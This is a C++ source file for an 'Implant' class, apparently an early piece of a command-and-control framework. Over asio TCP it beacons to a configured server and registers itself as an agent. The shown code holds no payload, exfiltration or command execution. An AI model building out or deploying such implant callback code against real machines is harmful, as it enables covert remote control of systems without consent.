#include <string>
#include <sstream>
#include <fstream>
#include <unistd.h>
#include <thread>

#include <asio.hpp>
#include <asio/ts/internet.hpp>
#include <asio/ts/buffer.hpp>

#include "implant.h"

using json = nlohmann::json;

Implant::Implant(std::string server_host, std::string server_port, std::string agent_id, bool isRunning):
    host{ std::move(server_host) },
    port{ std::move(server_port) }, 
    id{ std::move(agent_id) },
    isRunning{ std::move(isRunning) }
{
}

void Implant::beacon() {
    if (isRunning) {
        asio::error_code ec;
        asio::ip::tcp::endpoint endpoint(asio::ip::make_address(host, ec), std::stoi(port));
        asio::ip::tcp::socket socket(context); 

        socket.async_connect(endpoint, [&](const asio::error_code& error) {
            if (!error) {
                std::cout << "Connected to the server!" << std::endl;
                // Send Register Info
                registerAgent(socket);
            } else {
                // Check for specific errors
                if (error == asio::error::connection_refused) {
                    std::cout << "Connection refused. The server may not be running." << std::endl;
                } else {
                    std::cout << "Error connecting to the server: " << error.message() << std::endl;
                }
            }
        });

        context.run();
        socket.close();
    }
}

void Implant::registerAgent(asio::ip::tcp::socket& socket) {
    // check if registered, if not register
    std::string message = "Agent registered"; 

    // build request obj
    msg::MessageHeader header;
    header.size = message.size();
    header.type = msg::MessageType::RegisterAgent;

    msg::Request request;
    request.header = header;
    request.body = std::vector<uint8_t>(message.begin(), message.end());

    msg::sendRequest(socket, request);
}

void Implant::setRunning(bool running) { isRunning = running; }
void Implant::setId(std::string& new_agent_id) { id = new_agent_id; }